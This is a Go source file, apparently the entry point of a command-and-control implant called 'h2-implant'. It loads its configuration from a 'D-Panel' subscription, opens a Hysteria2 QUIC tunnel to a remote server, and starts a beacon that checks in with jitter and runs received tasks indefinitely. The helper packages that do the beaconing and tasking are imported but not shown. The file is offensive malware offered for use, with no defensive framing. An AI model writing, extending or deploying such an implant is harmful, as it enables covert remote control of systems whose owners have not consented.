package main

import (
	"flag"
	"fmt"
	"h2-c2-implant/beacon"
	"h2-c2-implant/config"
	"h2-c2-implant/transport"
	"os"
	"runtime"
)

func main() {
	version := flag.Bool("v", false, "print version")
	flag.Parse()

	if *version {
		fmt.Println("h2-implant v0.1 — D-Panel QUIC implant | Built on your existing hysteria2 panel")
		os.Exit(0)
	}

	fmt.Printf("[+] h2-implant starting on %s/%s\n", runtime.GOOS, runtime.GOARCH)

	cfg := config.LoadBootstrap()
	if err := config.FetchFullConfigFromSubscription(cfg); err != nil {
		fmt.Printf("[-] Failed to bootstrap from D-Panel subscription: %v\n", err)
		os.Exit(1)
	}

	tun := transport.NewHysteriaTunnel(cfg)
	if err := tun.Connect(); err != nil {
		fmt.Printf("[-] Hysteria2 tunnel failed: %v\n", err)
		os.Exit(1)
	}

	b := beacon.NewBeacon(tun, cfg)
	b.Start() // jittered beaconing + task execution forever
}